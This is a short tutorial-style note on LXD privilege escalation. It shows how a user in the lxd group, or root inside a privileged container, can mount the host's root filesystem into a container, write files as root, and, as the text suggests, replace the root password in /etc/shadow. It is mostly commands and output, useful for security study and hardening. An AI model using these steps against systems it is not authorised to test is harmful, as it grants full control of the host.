## LXD

## Privileged Containers

All bets are off with privileged containers, to test out creating one we want to do the following

```bash
sudo su
lxc launch ubuntu:16.04 --security.privileged=true
lxc exec <name> bash
useradd tecmint
passwd tecmint
mkdir /home/tecmint
chown tecmint:tecmint /home/tecmint
usermod -a -G lxd tecmint
su tecmint
```

If you have either root privileges within a privileged container, or are a member of the lxd group, you can easily get root access on the host.  To do this, you'll have to mount the root directory under a container.

```bash
ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
Creating test 
ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
Device whatever added to test 
ubuntu@ubuntu:~$ lxc start test 
ubuntu@ubuntu:~$ lxc exec test bash
```

Here we see us creating a file within the /root/ directory under the mountpoint as shown.

```bash
root@test:~# cd /mnt/root 
root@test:/mnt/root# ls 
bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var 
boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz 
root@test:/mnt/root# cd root 
root@test:/mnt/root/root# ls 
root@test:/mnt/root/root# touch ICanDoWhatever 
root@test:/mnt/root/root# exit 
exit
```

And so we see that the file has been created within our root directory.

```bash
ubuntu@ubuntu:~$ sudo su 
root@ubuntu:/home/ubuntu# ls /root 
ICanDoWhatever 
root@ubuntu:/home/ubuntu#
```

This can be used quite trivially for container escape, as mounting the root directory in a nested container will mount the hosts container as all lxd commands run on the host.  While you won't be able to run arbitrary code on the host, you can write and read any file with root privileges, allowing you to, for example, write a new root password in the /etc/shadow folder.

References:

[https://linuxcontainers.org/lxc/getting-started/](https://linuxcontainers.org/lxc/getting-started/)

[https://github.com/lxc/lxd/issues/2003](https://github.com/lxc/lxd/issues/2003)

[https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)

[https://insights.ubuntu.com/2017/06/15/custom-user-mappings-in-lxd-containers/](https://insights.ubuntu.com/2017/06/15/custom-user-mappings-in-lxd-containers/)

